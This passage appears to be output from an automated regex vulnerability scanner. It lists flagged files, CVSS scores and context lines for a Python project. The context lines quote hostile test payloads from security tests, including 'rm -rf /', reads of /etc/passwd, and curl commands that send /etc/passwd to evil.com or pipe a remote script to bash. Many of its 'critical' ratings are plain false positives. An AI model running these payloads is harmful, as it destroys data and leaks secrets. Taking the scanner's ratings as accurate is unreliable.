      "type": "command_injection",
      "context": "        \n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        results.append((name, result.returncode == 0))"
    },
    {
      "file": "TestMaster_BACKUP_20250816_175859\\archive\\original_backup\\testmaster_orchestrator.py",
      "line": 28,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\n"
    },
    {
      "file": "TestMaster_BACKUP_20250816_175859\\archive\\original_backup\\week_5_8_batch_converter.py",
      "line": 29,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    print(\"Installing Google Gen AI SDK...\")\n    os.system(\"pip install google-generativeai\")\n    import google.generativeai as genai"
    },
    {
      "file": "TestMaster_BACKUP_20250816_175859\\archive\\original_backup\\cache\\intelligent_cache.py",
      "line": 20,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import sqlite3\nimport pickle\nimport zlib"
    },
    {
      "file": "TestMaster_BACKUP_20250816_175859\\archive\\original_backup\\config\\testmaster_config.py",
      "line": 542,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            import ast\n            value = ast.literal_eval(value)\n        except:"
    },
    {
      "file": "TestMaster_BACKUP_20250816_175859\\archive\\original_backup\\incremental\\dependency_tracker.py",
      "line": 25,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\n"
    },
    {
      "file": "TestMaster_BACKUP_20250816_175859\\cache\\intelligent_cache.py",
      "line": 20,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import sqlite3\nimport pickle\nimport zlib"
    },
    {
      "file": "TestMaster_BACKUP_20250816_175859\\config\\testmaster_config.py",
      "line": 542,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            import ast\n            value = ast.literal_eval(value)\n        except:"
    },
    {
      "file": "TestMaster_BACKUP_20250816_175859\\incremental\\dependency_tracker.py",
      "line": 25,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\n"
    },
    {
      "file": "tests\\security\\test_intelligence_hub_comprehensive.py",
      "line": 206,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"__import__('os').system('rm -rf /')\",\n            \"eval('malicious_code')\",\n            \"<script>alert('XSS')</script>\","
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 30,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        @staticmethod\n        def safe_eval(expr, allowed=None):\n            return {}"
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 51,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def test_eval_injection_prevention(self):\n        \"\"\"Test that eval() usage is replaced with safe alternatives\"\"\"\n        # Arrange"
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 56,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"exec('import subprocess; subprocess.call([\\\"rm\\\", \\\"-rf\\\", \\\"/\\\"])')\",\n            \"eval('__import__(\\\"subprocess\\\").call([\\\"malicious_command\\\"])')\",\n            \"open('/etc/passwd').read()\","
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 67,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            with pytest.raises((ValueError, SyntaxError, SecurityError)):\n                SafeCodeExecutor.safe_eval(payload)\n    "
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 84,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                result = SafeCodeExecutor.safe_eval(expression)\n                assert result is not None"
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 132,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"__import__('os').system('rm -rf /')\",\n            \"eval('malicious_code')\",\n            \"exec('import subprocess')\","
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 134,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"exec('import subprocess')\",\n            \"'normal' + eval('malicious')\",\n            \"{'key': eval('dangerous')}\""
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 135,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"'normal' + eval('malicious')\",\n            \"{'key': eval('dangerous')}\"\n        ]"
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 499,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        for source in secret_sources:\n            result = self._mock_secret_retrieval(source)\n            "
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 515,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    def _mock_secret_retrieval(self, source):\n        \"\"\"Mock secure secret retrieval\"\"\""
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 55,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"__import__('os').system('rm -rf /')\",\n            \"exec('import subprocess; subprocess.call([\\\"rm\\\", \\\"-rf\\\", \\\"/\\\"])')\",\n            \"eval('__import__(\\\"subprocess\\\").call([\\\"malicious_command\\\"])')\","
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 91,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def test_exec_injection_prevention(self):\n        \"\"\"Test that exec() usage is replaced with safe alternatives\"\"\"\n        # Arrange"
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 95,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"import os; os.system('malicious_command')\",\n            \"exec('import subprocess; subprocess.call([\\\"rm\\\", \\\"-rf\\\", \\\"/\\\"])')\",\n            \"__import__('sys').exit(1)\","
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 105,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            with pytest.raises((ValueError, SecurityError)):\n                SafeCodeExecutor.safe_exec(code)\n    "
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 121,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                namespace = SafeCodeExecutor.safe_exec(code)\n                assert isinstance(namespace, dict)"
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 133,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"eval('malicious_code')\",\n            \"exec('import subprocess')\",\n            \"'normal' + eval('malicious')\","
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 153,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    def test_subprocess_shell_injection_prevention(self):\n        \"\"\"Test that subprocess shell=True is replaced with safe alternatives\"\"\"\n        # Arrange"
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 94,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "        malicious_code_samples = [\n            \"import os; os.system('malicious_command')\",\n            \"exec('import subprocess; subprocess.call([\\\"rm\\\", \\\"-rf\\\", \\\"/\\\"])')\","
    },
    {
      "file": "tests\\security\\test_security_comprehensive.py",
      "line": 160,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "            \"whoami; curl -X POST https://evil.com --data @/etc/passwd\",\n            \"python -c 'import os; os.system(\\\"malicious\\\")'\",\n            \"$(curl -s https://evil.com/script.sh | bash)\""
    }
  ],
  "summary": {
    "total_files_scanned": 10431,
    "vulnerabilities_found": 689,
    "critical_count": 518,
    "high_count": 142,
    "medium_count": 29
  }
}